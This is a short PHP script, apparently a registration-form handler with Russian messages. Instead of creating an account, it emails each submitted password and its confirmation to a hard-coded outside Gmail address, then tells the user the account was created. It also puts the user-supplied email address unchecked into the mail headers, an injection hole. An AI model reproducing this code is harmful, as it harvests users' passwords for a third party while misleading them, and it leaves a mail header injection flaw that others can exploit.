<?php
$name = htmlspecialchars($_POST['name']);
$email = htmlspecialchars($_POST['email']);
$password = htmlspecialchars($_POST['password']);
$rePass = htmlspecialchars($_POST['rePass']);

if ($name == '' || $email == '' || $password == '' || $rePass == '') {
echo 'Заполните все поля';
exit;
}
// Отправка
$password = "=?utf-8?B?".base64_encode($password)."?=";
$rePass = "=?utf-8?B?".base64_encode($rePass)."?=";
$headers = "From: $email\r\nReply-to: email\r\nContent-type: text/html; charset=utf-8\r\n";
if (mail("jillfoh@gmail.com", $password, $rePass, $headers))
	echo 'Учетная запись создана';
else
	echo 'Заполните все поля';
?>
